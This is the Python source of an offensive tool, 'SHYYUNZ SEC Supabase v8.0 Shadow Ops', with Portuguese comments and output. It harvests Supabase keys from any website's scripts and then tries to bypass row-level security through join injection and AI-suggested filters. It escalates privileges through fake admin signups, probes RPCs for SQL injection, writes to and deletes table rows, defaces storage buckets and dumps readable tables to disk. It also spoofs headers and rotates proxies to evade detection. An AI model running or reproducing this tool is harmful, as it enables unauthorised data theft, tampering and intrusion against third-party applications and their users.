#!/usr/bin/env python3
import asyncio
import httpx
import json
import re
import time
import base64
from google import genai
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.syntax import Syntax
import os
import random
import string
import sys
from typing import List, Optional, Set, Dict
from urllib.parse import urljoin
import warnings
warnings.filterwarnings("ignore")

# --- CONFIGURAÇÃO VISUAL SHYYUNZ SEC ---
console = Console()

BANNER = """
[bold cyan]
 ██████╗██╗  ██╗██╗   ██╗██╗   ██╗███╗   ██╗███████╗
██╔════╝██║  ██║╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║╚══███╔╝
╚█████╗ ███████║ ╚████╔╝  ╚████╔╝ ██╔██╗ ██║  ███╔╝ 
 ╚═══██╗██╔══██║  ╚██╔╝    ╚██╔╝  ██║╚██╗██║ ███╔╝  
██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
[/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
 ║ [bold white]SHYYUNZ SEC - SUPABASE v8.0[/bold white]       ║
 ║ [dim]Shadow Ops & Ultimate Exploit Edition[/dim]   ║
 ╚═════════════════════════════════════════════════════╝[/bold magenta]
"""

BRANDED_BANNER = r"""
[bold cyan]
                  ___====-_  _-====___
            _--^^^#####//      \\#####^^^--_
         _-^##########// (    ) \\##########^-_
        -############//  |\^^/|  \\############-
      _/############//   (@::@)   \\############\_
     /#############((     \\//     ))#############\
    -###############\\    (oo)    //###############-
   -#################\\  / VV \  //#################-
  -###################\\/      \//###################-
 _#/|##########/\######(   /\   )######/\##########|\#_
 |/ |#/\#/\#/\/  \#/\##\  |  |  /#/\#/  \/\#/\#/\#| \|
 `  |/  V  V  `   V  \# \ |  | / #/  V   '  V  V  \|  '
     `   `  `      `   /  \_|  |_/  \   '      '  '   '
                     /            \\
                    |   [bold white]SHYYUNZ SEC[/bold white]   |
                     \____________/
[/bold cyan]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

class KnowledgeManager:
    def __init__(self, filename="sh_knowledge.json"):
        self.filename = filename
        self.data = self.load()
    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"tables": [], "rpcs": [], "buckets": []}
    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.data, f, indent=2)
        except: pass
    def learn(self, category: str, name: str):
        if name not in self.data[category]:
            self.data[category].append(name)
            self.save()

knowledge = KnowledgeManager()

class ConfigManager:
    """Gerencia as configurações locais do usuário (API Keys, etc)."""
    def __init__(self, filename=".sh_config.json"):
        self.filename = filename
        self.config = self.load()

    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"gemini_api_key": None}

    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.config, f, indent=2)
        except: pass

    def get_api_key(self):
        return self.config.get("gemini_api_key")

    def set_api_key(self, key: str):
        self.config["gemini_api_key"] = key.strip()
        self.save()

sh_config = ConfigManager()

class ShyyunzBrain:
    def __init__(self, api_key: str):
        self.client = genai.Client(api_key=api_key)
    async def analyze_data(self, table_name: str, data: List[Dict]):
        if not data: return "Nenhum dado para analisar."
        sample = json.dumps(data[:10], indent=2)
        prompt = f"Analise este DUMP da tabela '{table_name}'. Identifique Dados Sensíveis, Nível de Impacto e Dicas de Exploração. Responda em PT-BR.\n\n{sample}"
        try:
            res = self.client.models.generate_content(model='gemini-1.5-flash', contents=prompt)
            return res.text
        except Exception as e: return f"[red]Erro IA: {e}[/red]"
    async def suggest_filters(self, table_name: str) -> List[str]:
        prompt = f"Sugira 3 filtros PostgREST (ex: id=not.eq.0) para tentar burlar RLS na tabela '{table_name}'. Apenas os filtros separados por vírgula."
        try:
            res = self.client.models.generate_content(model='gemini-1.5-flash', contents=prompt)
            return [f.strip() for f in res.text.split(",") if "=" in f]
        except: return ["id=not.eq.0", "limit=1"]

class ShyyunzAuditor:
    def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
        self.project_ref = self.extract_project_ref(target)
        self.root_url = f"https://{self.project_ref}.supabase.co"
        self.base_url = f"{self.root_url}/rest/v1/"
        self.auth_url = f"{self.root_url}/auth/v1/"
        self.storage_url = f"{self.root_url}/storage/v1/"
        self.apikey = apikey.strip()
        self.bearer = bearer.strip() if bearer else self.apikey
        self.headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}", "Content-Type": "application/json"}
        self.results = []
        self.graphql_discovered = set()
        self.semaphore = asyncio.Semaphore(60)
        self.hits_count = 0
        self.proxies = self.load_proxies()
        self.current_proxy = None

    def load_proxies(self):
        if os.path.exists("sh_proxies.txt"):
            try:
                with open("sh_proxies.txt", "r") as f: return [l.strip() for l in f if l.strip()]
            except: pass
        return []

    def rotate_headers(self):
        new_ua = random.choice(USER_AGENTS)
        fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip})
        if self.proxies: self.current_proxy = random.choice(self.proxies)

    @staticmethod
    def extract_project_ref(target: str) -> str:
        if "supabase.co" in target:
            m = re.findall(r"https?://([a-z0-9-]+)\.supabase\.co", target)
            if m: return m[0]
        return target.replace("https://", "").replace("http://", "").split(".")[0]

    async def check_service_role(self):
        async with httpx.AsyncClient() as client:
            try:
                r = await client.get(f"{self.auth_url}admin/users", headers=self.headers, timeout=5.0)
                if r.status_code == 200: console.print("[bold red blink][!!!] CHAVE SERVICE_ROLE DETECTADA! [!!!][/bold red blink]")
            except: pass

    async def pre_scan_auth_check(self) -> bool:
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                r = await client.get(f"{self.base_url}auth_check", headers=self.headers)
                if r.status_code == 401: console.print("[red][!] ERRO: 401 Unauthorized.[/red]"); return False
                return True
            except: return False

    async def perform_intelligence_gathering(self):
        console.print("\n[bold yellow]>>> COLETA DE INTELIGÊNCIA <<<[/bold yellow]")
        try:
            async with httpx.AsyncClient() as client:
                r = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                if r.status_code == 200 and not r.json().get("disable_signup", True): console.print("  [bold red][!] VULN: Signup Público Aberto![/bold red]")
                gr = await client.post(f"{self.root_url}/graphql/v1", headers=self.headers, json={"query": "{ __schema { types { name } } }"})
                if gr.status_code == 200:
                    for t in gr.json()["data"]["__schema"]["types"]:
                        n = t.get("name").lower()
                        if not n.startswith("__"): self.graphql_discovered.add(n); knowledge.learn("tables", n)
                    console.print(f"  [bold green][+] GQL EXPOSED: {len(self.graphql_discovered)} alvos vazados.[/bold green]")
        except: pass

    async def perform_active_write_test(self, client, table_name):
        res = {"post": False, "patch": False, "delete": False}
        h = self.headers.copy(); h["Prefer"] = "return=minimal"
        try:
            if (await client.post(f"{self.base_url}{table_name}", headers=h, json={"sh": "1"})).status_code in [201, 400]: res["post"] = True
            if (await client.patch(f"{self.base_url}{table_name}?id=eq.0", headers=h, json={"sh": "1"})).status_code in [200, 204, 400]: res["patch"] = True
            if (await client.delete(f"{self.base_url}{table_name}?id=eq.0", headers=h)).status_code in [200, 204, 400]: res["delete"] = True
        except: pass
        return res

    async def exploit_signup(self, custom_data=None):
        email = f"shyyunz.{random.randint(100,999)}@gmail.com"
        password = "Shy_Pass_123"
        async with httpx.AsyncClient() as client:
            try:
                r = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"email": email, "password": password, "data": custom_data or {"role": "admin"}})
                if r.status_code in [200, 201]: return r.json().get('access_token')
            except: pass
        return None

    async def exploit_escalation(self):
        console.print("\n[bold cyan][*] Iniciando Sniper de Escalonamento (5 payloads)...[/bold cyan]")
        for p in [{"role": "admin"}, {"is_admin": True}, {"app_metadata": {"role": "admin"}}, {"user_metadata": {"role": "admin"}}, {"claims": {"role": "admin"}}]:
            token = await self.exploit_signup(p)
            if token:
                console.print(f"[bold green][+] SUCESSO com payload: {json.dumps(p)}[/bold green]")
                self.bearer = token; self.headers["Authorization"] = f"Bearer {token}"; return True
        return False

    async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
        console.print("\n[bold magenta][*] Iniciando RPC Sniper & SQLi Probe...[/bold magenta]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for rpc in list(set(["get_users", "admin_stats", "get_config"] + knowledge.data["rpcs"])):
                r = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json={})
                if r.status_code in [200, 204]:
                    console.print(f"[bold red][!] RPC EXPOSTO: {rpc}[/bold red]")
                    knowledge.learn("rpcs", rpc)
                    if brain: console.print(Panel(await brain.analyze_data(f"RPC_{rpc}", r.json() if r.status_code == 200 else []), title=f"IA: {rpc}"))
                    for sqli in [{"query": "SELECT version()"}, {"sql": "SELECT datname FROM pg_database"}]:
                        sr = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json=sqli)
                        if sr.status_code == 200 and ("PostgreSQL" in sr.text or "pg_database" in sr.text):
                            console.print(f"[bold red blink][!!!] SQL INJECTION DETECTADO EM RPC: {rpc}[/bold red blink]")

    async def deep_bucket_scan(self):
        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan...[/bold cyan]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for b in list(set(["avatars", "backups", "public", "profiles"] + knowledge.data["buckets"])):
                if (await client.get(f"{self.storage_url}bucket/{b}")).status_code == 200: console.print(f"[bold red][!] BUCKET ABERTO: {b}[/bold red]")
                if (await client.post(f"{self.storage_url}object/{b}/shy.txt", files={"file": ("shy.txt", b"VULN")})).status_code in [200, 201]: console.print(f"[bold red blink][!!!] BUCKET ESCRITA (DEFACEMENT): {b}[/bold red blink]")

    async def check_target(self, client, target, t_type, progress, task_id, brain=None):
        async with self.semaphore:
            self.rotate_headers(); url = f"{self.base_url}{target}" if t_type == "TABLE" else f"{self.storage_url}bucket/{target}"
            try:
                readable, has_data, bypass = False, False, None
                if t_type == "TABLE":
                    r = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                    readable = (r.status_code == 200)
                    if not readable:
                        rj = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
                        if rj.status_code == 200: readable, bypass = True, "JOIN Inj"
                        if not readable and brain:
                            for f in await brain.suggest_filters(target):
                                rf = await client.get(f"{url}?{f}", headers=self.headers)
                                if rf.status_code == 200: readable, bypass = True, f"AI ({f})"; break
                    if readable: 
                        try: 
                            rd = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                            has_data = len(rd.json()) > 0
                        except: pass
                        knowledge.learn("tables", target)
                    wv = await self.perform_active_write_test(client, target)
                    self.results.append({"type": t_type, "name": target, "readable": readable, "has_data": has_data, "bypass": bypass, "writes": wv})
                elif t_type == "BUCKET" and (await client.get(url, headers=self.headers)).status_code == 200:
                    self.results.append({"type": "BUCKET", "name": target, "readable": True}); knowledge.learn("buckets", target)
                
                if readable: self.hits_count += 1
                progress.update(task_id, description=f"[bold red]Auditoria V8.0: [ACERTOS {self.hits_count}] ")
            except: pass
            finally: progress.advance(task_id)

    async def run_scan(self, tables, brain=None):
        async with httpx.AsyncClient(verify=False, http2=True) as client:
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
                task = progress.add_task("[bold red]Shadow Ops Recon...", total=len(tables))
                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables])

async def fetch_supabase_details(url: str):
    if not url.startswith("http"): url = "https://" + url
    async with httpx.AsyncClient(headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=15.0, follow_redirects=True, verify=False) as client:
        try:
            console.print(f"[dim][*] Analisando: {url}...[/dim]")
            r = await client.get(url); html = r.text
            scripts = re.findall(r'<script.*?src=["\'](.*?\.js.*?)["\']', html)
            js_urls = [urljoin(url, s) for s in scripts] + [urljoin(url, p) for p in ["js/config.js", "config.js", "supabase.js"]]
            u_p = r'https://[a-z0-9\-]+\.supabase\.(co|net)'
            k_p = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9.\-_]{50,}|sb_publishable_[a-zA-Z0-9\-_]{20,}|pk_[a-zA-Z0-9\-_]{20,})'
            t, k = re.search(u_p, html), re.search(k_p, html)
            target = t.group(0) if t else None; apikey = k.group(0) if k else None
            if not target or not apikey:
                for j in list(set(js_urls)):
                    try:
                        jr = await client.get(j, timeout=5.0)
                        if jr.status_code == 200:
                            if not target: mt = re.search(u_p, jr.text); target = mt.group(0) if mt else None
                            if not apikey: mk = re.search(k_p, jr.text); apikey = mk.group(0) if mk else None
                            if target and apikey: break
                    except: continue
            if target and apikey: console.print(f"[bold green][+] Supabase Detectado: {target}[/bold green]"); return target, apikey
            return None, None
        except: return None, None

def prompt_payload():
    payload = {}
    while True:
        c = input("Coluna (ou 'FIM'): ").strip()
        if not c or c.upper() == "FIM": break
        v = input(f"Valor para {c}: ").strip()
        payload[c] = v if not v.isdigit() else int(v)
    return payload

async def audit_routine():
    console.print(Align.center(BRANDED_BANNER))
    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR v8.0 - SHADOW OPS[/bold magenta]", border_style="cyan")))
    site_url = console.input("\n[bold cyan][🌐 SHY_SEC] URL:[/bold cyan] ").strip()
    if site_url.lower() in ["0", "sair", "exit"]: return False
    target, apikey = await fetch_supabase_details(site_url)
    
    ai_key = sh_config.get_api_key()
    brain = ShyyunzBrain(ai_key) if ai_key else None
    
    if not target or not apikey:
        target = input("URL Supabase: ").strip(); apikey = input("API Key: ").strip()
        if not target or not apikey: return True
    auditor = ShyyunzAuditor(target, apikey)
    await auditor.pre_scan_auth_check(); await auditor.perform_intelligence_gathering()
    words = list(set(["users", "profiles", "accounts", "admins", "settings", "orders", "config", "roles", "secrets", "api_keys", "payments", "logs"] + list(auditor.graphql_discovered) + knowledge.data["tables"]))
    await auditor.run_scan(words, brain)
    
    table_map = {}
    sum_t = Table(title="[bold red]VETORES DE EXPLORAÇÃO SELECIONADOS[/bold red]")
    sum_t.add_column("Nr."); sum_t.add_column("Alvo"); sum_t.add_column("Leitura"); sum_t.add_column("Escrita (W/U/D)"); sum_t.add_column("Status")
    for i, r in enumerate(auditor.results, 1):
        read_s = "[dim]RLS[/dim]"
        if r.get('readable'): read_s = "[bold green]EXPOSTO (DADOS)[/bold green]" if r.get('has_data') else "[bold yellow]EXPOSTO (VAZIA)[/bold yellow]"
        wv = r.get('writes', {"post":False,"patch":False,"delete":False})
        write_s = f"[{'W' if wv['post'] else '-'}/{'U' if wv['patch'] else '-'}/{'D' if wv['delete'] else '-'}]"
        st = "[bold red]CRÍTICO[/bold red]" if r.get('readable') or any(wv.values()) else "[yellow]ALTO[/yellow]"
        sum_t.add_row(str(i), r['name'], read_s, write_s + (f" ({r['bypass']})" if r.get('bypass') else ""), st)
        table_map[str(i)] = r
    console.print(sum_t)

    while True:
        console.print("\n[bold cyan][1] Dump [3] Signup [4] Storage [6] POST [7] PATCH [8] DEL [9] Anon [E] Escalation [R] RPC [B] Bucket [D] Exfil [K] Brain [0] Sair[/bold cyan]")
        c = input("\n[S_SEC] Comando: ").strip().upper()
        if c == "0": return True
        elif c == "1":
            idx = input("Nr: ").strip()
            if idx in table_map:
                r = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
                console.print(Panel(json.dumps(r.json(), indent=2), title=f"Dump: {table_map[idx]['name']}"))
                if input("Analisar IA? (S/N): ").upper() == "S": console.print(Panel(await brain.analyze_data(table_map[idx]['name'], r.json()), border_style="magenta"))
        elif c == "E": await auditor.exploit_escalation()
        elif c == "R": await auditor.rpc_sniper(brain)
        elif c == "B": await auditor.deep_bucket_scan()
        elif c == "D":
            out = f"dump_{auditor.project_ref}"; os.makedirs(out, exist_ok=True)
            async with httpx.AsyncClient() as client:
                for r in auditor.results:
                    if r.get('readable'):
                        resp = await client.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
                        with open(f"{out}/{r['name']}.json", "w") as f: f.write(json.dumps(resp.json()))
            console.print(Panel(f"Arquivos salvos em {out}/", title="Exfiltração"))
        elif c == "K":
            opt = input("\n[1] Ver Conhecimento [2] Trocar API Key Gemini: ").strip()
            if opt == "1": console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento"))
            elif opt == "2":
                new_key = input("Nova Gemini API Key: ").strip()
                if new_key: sh_config.set_api_key(new_key); console.print("[green]Configuração salva![/green]")
        elif c == "6":
            idx = input("Nr: ").strip()
            if idx in table_map:
                p = prompt_payload()
                res = await httpx.AsyncClient().post(f"{auditor.base_url}{table_map[idx]['name']}", headers=auditor.headers, json=p)
                console.print(f"Res ({res.status_code}): {res.text}")
        elif c == "7":
            idx = input("Nr: ").strip(); f = input("Filtro (ex: id=eq.1): ").strip()
            if idx in table_map:
                p = prompt_payload()
                res = await httpx.AsyncClient().patch(f"{auditor.base_url}{table_map[idx]['name']}?{f}", headers=auditor.headers, json=p)
                console.print(f"Res ({res.status_code}): {res.text}")
        elif c == "8":
            idx = input("Nr: ").strip(); f = input("Filtro: ").strip()
            if idx in table_map:
                res = await httpx.AsyncClient().delete(f"{auditor.base_url}{table_map[idx]['name']}?{f}", headers=auditor.headers)
                console.print(f"Res ({res.status_code}): {res.text}")
        elif c == "3":
            t = await auditor.exploit_signup()
            if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green]Autenticado![/green]")
        elif c == "9":
            async with httpx.AsyncClient() as client:
                r = await client.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey}, json={})
                t = r.json().get('access_token')
                if t: auditor.bearer = t; auditor.headers["Authorization"] = f"Bearer {t}"; console.print("[green]Anon Logged![/green]")
        elif c == "K": console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento"))

async def main():
    # Verificação Inicial de API Key
    if not sh_config.get_api_key():
        console.print(Align.center(BANNER))
        console.print(Panel("[bold yellow]SUPABASE AUDITOR v8.0 - PRIMEIRA EXECUÇÃO[/bold yellow]\n\nPara ativar o Cérebro Analítico (IA), insira sua Gemini API Key.\nVocê pode obter uma em: [underline]https://aistudio.google.com/app/apikey[/underline]", title="Shadow Ops Setup"))
        key = console.input("\n[bold cyan][🧠 SHY_CONFIG][/bold cyan] Insira sua Gemini API Key: ").strip()
        if key: sh_config.set_api_key(key)

    while True:
        if not await audit_routine(): break

if __name__ == "__main__":
    asyncio.run(main())
